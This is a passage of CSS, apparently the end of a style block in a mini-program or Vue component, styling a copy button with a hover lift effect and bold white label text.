	border-radius: 50rpx;
	padding: 25rpx 60rpx;
	display: inline-block;
	cursor: pointer;
	transition: all 0.3s ease;
}

.copy-button:hover {
	background-color: rgba(255, 255, 255, 0.3);
	transform: translateY(-2rpx);
}

.copy-text {
	font-size: 32rpx;
	color: white;
	font-weight: bold;
}
</style>